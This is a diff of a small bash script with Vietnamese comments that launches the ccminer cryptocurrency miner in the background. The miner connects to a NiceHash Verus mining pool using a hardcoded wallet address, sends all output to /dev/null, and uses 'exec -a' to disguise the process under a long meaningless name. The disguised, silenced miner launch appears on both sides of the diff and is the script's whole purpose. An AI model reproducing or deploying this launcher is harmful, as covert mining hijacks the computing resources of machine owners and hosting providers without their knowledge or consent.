@@ -1,6 +1,10 @@
-#!/bin/sh
+#!/bin/bash
+# Đảm bảo shell là bash
 read -t 100 -p "Đang chờ trong 5 giây..."
 
-bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200#xnsub -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG12 -p x -t 1 > /dev/null 2>&1" &
-    
-    
+# Tạo chuỗi tên dài (có thể tạo từ biến nếu cần)
+long_name="HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo"
+
+# Sử dụng exec với chuỗi tên dài
+bash -c "exec -a '$long_name' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200#xnsub -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG12 -p x -t 1 > /dev/null 2>&1" &
+
